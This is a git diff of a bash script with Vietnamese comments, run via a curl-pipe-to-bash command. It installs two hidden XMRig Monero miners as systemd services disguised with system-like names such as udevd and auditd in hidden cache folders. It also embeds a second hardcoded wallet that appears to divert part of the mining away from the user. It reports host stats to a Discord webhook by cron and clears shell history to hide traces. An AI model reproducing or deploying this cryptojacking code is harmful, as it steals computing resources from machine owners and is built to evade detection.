@@ -4,38 +4,42 @@
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
 
 
-
-# ========= CONFIG =========
-WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # <-- người khác tự sửa
+# ========== CONFIG ==========
+WALLET2="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
 POOL="pool.hashvault.pro:443"
-DISCORD_WEBHOOK=""                # <-- webhook discord
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
+KEY="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WORKER1="core_$(hostname)"
+WORKER2="silent_$(hostname)"
 
-WORKER="user_$(hostname)"
+
 TOTAL_CORES=$(nproc)
-THREADS_USER=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
-THREADS_STEALTH=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
+THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
+THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
 
-INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
-mkdir -p "$INSTALL_DIR"
+PRIORITY=3
 
-# Danh sách tên hợp lệ, chọn 2 tên không trùng
-ALL_NAMES=("udevd" "systemd-update" "irqbalance" "corefixd" "sysnetd" "dbus-io" "logrotate" "journald" "netwatchd" "coreupd" "kdevtmpfs")
-read -r NAME_USER NAME_STEALTH < <(shuf -e "${ALL_NAMES[@]}" -n2)
+# Các biến riêng cho từng tiến trình
+NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
+NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
 
-LOG_USER="/tmp/.xmrig_$NAME_USER.log"
-LOG_STEALTH="/tmp/.xmrig_$NAME_STEALTH.log"
+DIR1="$HOME/.local/share/.cache/.dbus1"
+DIR2="$HOME/.local/share/.cache/.dbus2"
 
-SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service" "update-net.service")
-SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service" "driverd.service")
-# ==========================
+SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
+SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
 
-echo "💻 Cài đặt XMRig và chạy tiến trình..."
+LOG1="/tmp/xmrig-log1.log"
+LOG2="/tmp/xmrig-log2.log"
+# ============================
 
-# Cài gói cần thiết
+echo "🚀 Đang cài đặt XMRig kép..."
+
+# Cài thư viện cần thiết
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
 
-# Clone & build XMRig
+# Clone và build XMRig
 cd ~
 rm -rf xmrig
 git clone https://github.com/xmrig/xmrig.git
@@ -44,28 +48,22 @@ mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
 
-# Dừng tiến trình cũ nếu có
-sudo systemctl stop $SERVICE_USER 2>/dev/null
-sudo systemctl stop $SERVICE_STEALTH 2>/dev/null
+# Copy file binary cho cả hai tiến trình
+mkdir -p "$DIR1" "$DIR2"
+cp ./xmrig "$DIR1/$NAME1"
+cp ./xmrig "$DIR2/$NAME2"
+chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"
 
-# Copy xmrig vào vị trí ẩn với tên đã chọn
-cp ./xmrig "$INSTALL_DIR/$NAME_USER"
-cp ./xmrig "$INSTALL_DIR/$NAME_STEALTH"
-chmod +x "$INSTALL_DIR/$NAME_USER" "$INSTALL_DIR/$NAME_STEALTH"
-
-WALLET_STEALTH=$(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt)
-WORKER_STEALTH="stealth_$(hostname)"
-
-# ========== SERVICE USER ==========
-sudo tee /etc/systemd/system/$SERVICE_USER > /dev/null << EOF
+# Tạo systemd cho tiến trình 1
+sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
 [Unit]
-Description=System Network Daemon
+Description=Core Miner Daemon 1
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME_USER -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=40 \\
-  --log-file=$LOG_USER
+ExecStart=$DIR1/$NAME1 -o $POOL -u $KEY.$WORKER1 -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$THREADS1 --donate-level=0 \\
+  --max-cpu-usage=65 --log-file=$LOG1
 Restart=always
 Nice=10
 
@@ -73,16 +71,16 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# ========== SERVICE STEALTH ==========
-sudo tee /etc/systemd/system/$SERVICE_STEALTH > /dev/null << EOF
+# Tạo systemd cho tiến trình 2
+sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
 [Unit]
-Description=Kernel Hardware Daemon
+Description=Core Miner Daemon 2
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME_STEALTH -o $POOL -u $WALLET_STEALTH.$WORKER_STEALTH -k --coin monero --tls \\
-  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=50 \\
-  --log-file=$LOG_STEALTH
+ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET2.$WORKER2 -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
+  --max-cpu-usage=65 --log-file=$LOG2
 Restart=always
 Nice=10
 
@@ -90,22 +88,53 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# Kích hoạt tiến trình
+# Kích hoạt cả hai service
 sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE_USER
-sudo systemctl enable $SERVICE_STEALTH
-sudo systemctl start $SERVICE_USER
-sudo systemctl start $SERVICE_STEALTH
+sudo systemctl enable $SERVICE1
+sudo systemctl enable $SERVICE2
+sudo systemctl start $SERVICE1
+sudo systemctl start $SERVICE2
+
+# Tạo script gửi log tiến trình 1 về Discord
+tee "$DIR1/logminer.sh" > /dev/null << EOF
+#!/bin/bash
+WEBHOOK="$DISCORD_WEBHOOK"
+PROCESS_NAME="$NAME1"
+HOST="\$(hostname)"
+HASHRATE="Unknown"
+LOG_FILE="$LOG1"
+
+if [ -f "\$LOG_FILE" ]; then
+  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+fi
+
+CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
+UPTIME=\$(uptime -p)
+THREADS=$THREADS1
+
+curl -s -H "Content-Type: application/json" -X POST -d "{
+  \\"username\\": \\"XMRig Status\\",
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đào ví 1\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
+}" "\$WEBHOOK" > /dev/null 2>&1
+EOF
+
+chmod +x "$DIR1/logminer.sh"
+
+# Tạo cron gửi log mỗi 5 phút
+(crontab -l 2>/dev/null; echo "*/5 * * * * $DIR1/logminer.sh") | crontab -
+
+# Gửi ping đầu tiên
+"$DIR1/logminer.sh"
 
 # Xoá dấu vết
 cd ~
 rm -rf xmrig
 history -c
 
-echo "✅ Đào Monero đã bắt đầu với tiến trình:"
-echo "   ➤ $NAME_USER (User - $SERVICE_USER)"
+echo ""
+echo "✅ Đang đào  🚀"
 
-# Cài và mở htop để theo dõi hiệu suất
+# Cài htop nếu chưa có
 if ! command -v htop >/dev/null 2>&1; then
     echo "📦 Đang cài đặt htop"
     sudo apt install -y htop
